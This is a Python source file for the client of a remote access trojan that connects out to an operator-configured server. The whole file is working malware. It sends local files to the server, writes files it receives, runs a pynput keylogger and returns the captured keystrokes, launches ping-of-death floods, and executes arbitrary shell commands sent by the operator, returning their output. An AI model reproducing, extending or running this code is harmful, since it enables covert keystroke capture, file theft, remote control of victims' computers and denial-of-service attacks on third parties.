import socket, threading, requests, time, sys
import subprocess
from pathlib import Path
from pynput.keyboard import Listener


server_ip = ''          #Here goes your servers IP
server_port = 1234     #Here goes the port you're running your server on (1234 for default)

cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    cs.connect((server_ip, server_port))
    print("CLIENT CONNECTED")
except Exception as e:
    print(f"Failed to connect to the server: {e}")
    sys.exit()

msg = 'TEST CLIENT'

cs.send(msg.encode())
msg = cs.recv(1024).decode()

allkeys = ''
keylogging_mode = 0

def pressed(key):
    global allkeys
    allkeys = allkeys + str(key)

def release(key):
    pass

def keylog():
    global l
    l = Listener(on_press=pressed, on_release=release)
    l.start()

while msg != 'quit':
    fullmsg = msg
    msg = list(msg.split(" "))

    if msg[0] == 'download':
        filename = msg[1]
        with open(Path(filename), 'rb') as f:
            contents = f.read()
        cs.send(contents)
        msg = cs.recv(1024).decode()

    elif msg[0] == 'upload':
        filename = msg[1]
        filesize = int(msg[2])
        contents = cs.recv(filesize)
        with open(filename, 'wb') as f:
            f.write(contents)
        cs.send('got file'.encode())
        msg = cs.recv(1024).decode()

    elif fullmsg == 'keylog on':
        keylogging_mode = 1
        t1 = threading.Thread(target=keylog)
        t1.start()
        msg = "Keylog started"
        cs.send(msg.encode('utf-8'))
        msg = cs.recv(2048).decode()

    elif fullmsg == 'keylog off':
        if keylogging_mode == 1:
            l.stop()
            t1.join()
            cs.send(allkeys.encode('utf-8'))
            allkeys = ''
            msg = cs.recv(2038).decode()
            keylogging_mode = 0
        elif keylogging_mode == 0:
            msg = "Start the stupid keylogger"
            cs.send(msg.encode('utf-8'))
            msg = cs.recv(2038).decode()

    elif msg[0] == 'ping' and len(msg) == 5:
        target_ip = msg[1]
        print(fullmsg)
        process = subprocess.Popen(fullmsg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while True:
            line = process.stdout.readline().strip() if process else None
            if not line:
                time.sleep(0.1)
                continue
            if f'Reply from {target_ip}: bytes=65500' in line:
                output = "PING-OF-DEATH Command Executed Successfully"
                cs.send(output.encode('utf-8'))
                break
            elif f'Reply from {target_ip}: Destination host unreachable.' in line:
                output = "ERROR : Destination host unreachable."
                cs.send(output.encode('utf-8'))
                break
            elif f'Unknown host' in line:
                output = "ERROR : Unknown host."
                cs.send(output.encode('utf-8'))
                break

    else:
        p = subprocess.Popen(fullmsg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        output, error = p.communicate()
        if len(output) > 0:
            msg = str(output.decode())
        else:
            msg = str(error.decode())
        cs.send(msg.encode())
        msg = cs.recv(2048).decode()
        print(msg)


cs.send("quit".encode())
print("CLIENT DISCONNECTED")
cs.close()
